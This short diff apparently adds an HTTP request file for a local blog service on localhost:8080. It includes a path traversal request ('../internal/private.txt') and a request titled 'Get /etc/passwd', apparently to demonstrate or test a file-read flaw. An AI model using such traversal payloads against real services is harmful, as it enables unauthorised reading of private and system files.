@@ -1,0 +1,11 @@
+### Get intro blog
+
+GET http://localhost:8080/blogs?name=intro.txt
+
+### Get private info
+
+GET http://localhost:8080/blogs?name=../internal/private.txt
+
+### Get /etc/passwd
+
+GET http://localhost:8080/blogs?name=...
